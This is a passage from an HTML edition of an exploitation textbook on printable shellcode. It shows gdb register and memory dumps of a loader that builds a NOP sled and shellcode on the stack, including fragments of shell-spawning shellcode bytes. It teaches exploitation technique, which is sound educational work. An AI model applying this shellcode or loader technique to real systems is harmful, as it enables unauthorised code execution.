0xbffff9ba</p></td><td style="width:70pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff9ba</p></td><td style="width:66pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:146pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:123pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">esp      0xbffffa04</p></td><td style="width:70pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffffa04</p></td><td style="width:66pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:146pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:123pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">eax     0x90909090</p></td><td style="width:70pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-1869574000</p></td><td style="width:66pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:146pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:14pt"><td style="width:123pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">(gdb)</p></td><td style="width:70pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:66pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:146pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Now with the shellcode completely constructed on the stack, EAX is set to <span class="s31">0x90909090</span>. This is pushed to the stack repeatedly to build a NOP sled to bridge the gap between the end of the loader code and the newly constructed shellcode.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1156.png"/></span></p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) x/24x 0xbffff9ba</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff9ba:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x50505050</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x50505050</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x50505050</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x50505050</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff9ca:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x50505050</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000050</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000000</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x00000000</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff9da:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x00000000</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000000</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000000</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x00000000</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff9ea:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x00000000</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x00000000</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x00000000</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0x00000000</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff9fa:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x00000000</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x00000000</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90900000</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0x31909090</p></td></tr><tr style="height:10pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffffa0a:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 9pt;padding-right: 11pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x31db31c0</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xa4b099c9</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x0b6a80cd</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x2f685158</p></td></tr></table><p class="s31" style="padding-top: 2pt;padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) stepi 10</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:22pt"><td style="width:408pt" colspan="5"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff9c4 in ?? ()</p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;text-align: left;">(gdb) x/24x 0xbffff9ba</p></td></tr><tr style="height:10pt"><td style="width:64pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff9ba:</p></td><td style="width:62pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x50505050</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x50505050</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x50505050</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x50505050</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff9ca:</p></td><td style="width:62pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x50505050</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000050</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000000</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000000</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff9da:</p></td><td style="width:62pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90900000</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff9ea:</p></td><td style="width:62pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff9fa:</p></td><td style="width:62pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x31909090</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffffa0a:</p></td><td style="width:62pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x31db31c0</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xa4b099c9</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x0b6a80cd</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x2f685158</p></td></tr><tr style="height:10pt"><td style="width:64pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">(gdb) stepi 5</p></td><td style="width:62pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:146pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:22pt"><td style="width:408pt" colspan="5"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;text-align: left;">0xbffff9c9 in ?? ()</p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">(gdb) x/24x 0xbffff9ba</p></td></tr><tr style="height:12pt"><td style="width:64pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff9ba:</p></td><td style="width:62pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x50505050</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x50505050</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x50505050</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90905050</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff9ca:</p></td><td style="width:62pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff9da:</p></td><td style="width:62pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff9ea:</p></td><td style="width:62pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x90909090</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff9fa:</p></td><td style="width:62pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x90909090</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x31909090</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffffa0a:</p></td><td style="width:62pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x31db31c0</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xa4b099c9</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x0b6a80cd</p></td><td style="width:146pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x2f685158</p></td></tr><tr style="height:14pt"><td style="width:64pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">(gdb)</p></td><td style="width:62pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:146pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Now the execution pointer (EIP) can flow over the NOP bridge into the constructed shellcode.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Printable shellcode is a technique that can open some doors. It and all the other techniques we discussed are just building blocks that can be used in a myriad of different combinations. Their application requires some ingenuity on your part. Be clever and beat them at their own game.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="toc">&nbsp;</p><div class="toc"><a class="toc0" href="part153.htm">0x6a0 Hardening Countermeasures</a><a class="toc0" href="part154.htm">0x6b0 Nonexecutable Stack</a></div><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part151.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part153.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
